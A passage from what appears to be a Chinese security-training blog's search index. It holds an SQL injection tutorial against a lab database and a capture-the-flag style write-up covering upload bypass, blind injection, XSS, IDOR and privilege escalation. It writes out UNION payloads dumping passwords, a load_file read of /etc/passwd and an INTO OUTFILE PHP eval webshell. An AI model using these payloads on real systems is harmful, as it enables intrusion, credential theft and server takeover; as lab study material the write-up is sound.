class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"security"</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">"users"</span><span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>id,username,password</p></blockquote><h2 id="8-查询表中的数据">8. 查询表中的数据</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> security<span class="token punctuation">.</span>users<span class="token comment">#'limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>1DumbDumb,2AngelinaI-kill-you,3Dummyp@ssword,4securecrappy,5stupidstupidity,6supermangenious,7batmanmob!le,8adminadmin,9admin1admin1,10admin2admin2,11admin3admin3,12dhakkandumbo,14admin4admin4</p></blockquote><h1>获取服务器数据</h1><h2 id="1-判断服务器类型">1. 判断服务器类型</h2><p>linux服务器区分大小写，windows服务器不区分大小写<br>因此构造</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> iD<span class="token operator">=</span><span class="token string">'-1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错说明是linux</p><h2 id="2-通过load-file函数读取服务器文件">2. 通过load_file函数读取服务器文件</h2><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1>获取服务器权限</h1><p>利用into outfile将程序输出导出到文件</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[1]);?&gt;'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/666.php'</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 四叶草实训 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>佳作赏析</title>
      <link href="/2021/08/10/yuan-tou/"/>
      <url>/2021/08/10/yuan-tou/</url>
      
        <content type="html"><![CDATA[<h1>windows文件系统</h1><p><a href="https://blog.walterlv.com/post/ntfs-link-comparisons.html">比较 Windows 上四种不同的文件（夹）链接方式（NTFS 的硬链接、目录联接、符号链接，和大家熟知的快捷方式） - walterlv</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原偷 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训第十天wp</title>
      <link href="/2021/08/10/shi-xi-di-shi-tian/"/>
      <url>/2021/08/10/shi-xi-di-shi-tian/</url>
      
        <content type="html"><![CDATA[<h1>whatweb查询网页cms</h1><p><img src="https://i.loli.net/2021/08/10/IBFVeW6JKkgRTG4.png" alt="image-20210729101123841"></p><h1>修改返回的js，绕过前端验证上传头像</h1><p><img src="https://i.loli.net/2021/08/10/GgJPitKHbZ4CQSh.png" alt="image-20210729100042317"></p><h1>抓包得到头像上传url</h1><p>上传url为：<a href="http://116.62.203.33:84/index.php?ctl=avatar&amp;act=upload&amp;uid=2004%EF%BC%8C%E7%BC%BA%E5%B0%91%E9%AA%8C%E8%AF%81%E3%80%82%E5%8F%AF%E4%BB%A5%E7%BB%99%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E4%B8%8A%E4%BC%A0%E5%B9%B6%E8%A6%86%E7%9B%96%E5%A4%B4%E5%83%8F%E3%80%82">http://116.62.203.33:84/index.php?ctl=avatar&amp;act=upload&amp;uid=2004，缺少验证。可以给任意用户上传并覆盖头像。</a></p><p><img src="https://i.loli.net/2021/08/10/2lcv8RJLIHr4sXt.png" alt="image-20210729100251576"></p><h1>管理员账号泄漏</h1><p>对比可知其中一个管理员账户为admin</p><p><img src="https://i.loli.net/2021/08/10/t7l5GewBCJzuPSi.png" alt="image-20210729102608833"></p><p><img src="https://i.loli.net/2021/08/10/bNtqknEr4GdfxFg.png" alt="image-20210729102631335"></p><h1>积分商场sql注入</h1><p><a href="http://116.62.203.33:83/index.php?ctl=goods_information&amp;id=3">圣代千行科技</a></p><p>用sqlmap跑出来纯在时间盲注</p><p><img src="https://i.loli.net/2021/08/10/Gn5lLeIHxv3af9M.png" alt="image-20210729125039928"></p><p>同时发现数据库中存储了管理员密码admin1233321</p><p><img src="https://i.loli.net/2021/08/10/EwSo8ZLU7Qb9TD1.png" alt="image-20210729125955805"></p><h1>后台登录</h1><h2 id="xss">xss</h2><p>在后台编辑文章后存在xss</p><p><img src="https://i.loli.net/2021/08/10/OFuMhbNZe1m2VL3.png" alt="image-20210729131051384"></p><h1>担保机构页面文件上传</h1><p>担保机构页面有文件上传，没有任何过滤</p><p><img src="https://i.loli.net/2021/08/10/OucV582fqI1SRvr.png" alt="image-20210729135956659"></p><p>传上来可以直接连接</p><p><img src="https://i.loli.net/2021/08/10/eCBtFwPa9XYUE2y.png" alt="image-20210729135937442"></p><p>可以看到mysql账号的密码</p><p><img src="https://i.loli.net/2021/08/10/L45zIRldGvmM9r7.png" alt="image-20210729145219001"></p><h1>第二题</h1><h2 id="flag1">flag1</h2><p>提示需要本地打开在http header里添加X-Forwarded-For: 127.0.0.1，使用burp的修改功能在每一个包前面都加上</p><p><img src="https://i.loli.net/2021/08/10/CErv9JPFtMqlj1g.png" alt="image-20210730105418132"></p><p>构造后的包头如下</p><p><img src="https://i.loli.net/2021/08/10/I7EeXS5WQulYRwj.png" alt="image-20210730105510207"></p><p>成功登录，得到flag1:{b59c67bf196a4758191e42f76670ceba}</p><p><img src="https://i.loli.net/2021/08/10/SeOrioaMDCun27X.png" alt="image-20210730105521978"></p><h2 id="flag2">flag2</h2><p>扫描发现根目录下存在/flag.txt文件，打开得到flag2:{a8009e4841bd24d57201ad20667f3c4b}</p><p><img src="https://i.loli.net/2021/08/10/Ac7PRnCJ6KOIbty.png" alt="image-20210731083156313"></p><h2 id="flag3">flag3</h2><p>来到注册页面，注册一个名为admin的账户点击profile，发现是修改密码页面，地址为http://1.14.140.145:81/index.php?page=profile&amp;user_id=15。可以把链接改为http://1.14.140.145:81/index.php?page=profile&amp;user_id=1，发现可以访问，说明页面存在水平越权。遍历发现flag3</p><p><img src="https://i.loli.net/2021/08/10/TidfOkjyKUsmtaH.png" alt="image-20210730112307218"></p><p>打开源码发现被隐藏的部分，得到flag{934b535800b1cba8f96a5d72f72f1611}</p><p><img src="https://i.loli.net/2021/08/10/hdl64VDCx3cT9Gb.png" alt="image-20210730112640230"></p><h2 id="flag4">flag4</h2><p>对修改框做sql注入，得到flag4并且获得ssh的用户名和密码</p><p><img src="https://i.loli.net/2021/08/10/MEDRfnmWi67lgSL.png" alt="image-20210731083349317"></p><h2 id="flag5">flag5</h2><p>提权看flag5里的内容，得到flag{yunyansec}</p><p><img src="https://i.loli.net/2021/08/10/TGmVoLv24pPeDUw.png" alt="image-20210731092104303"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 四叶草实训 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
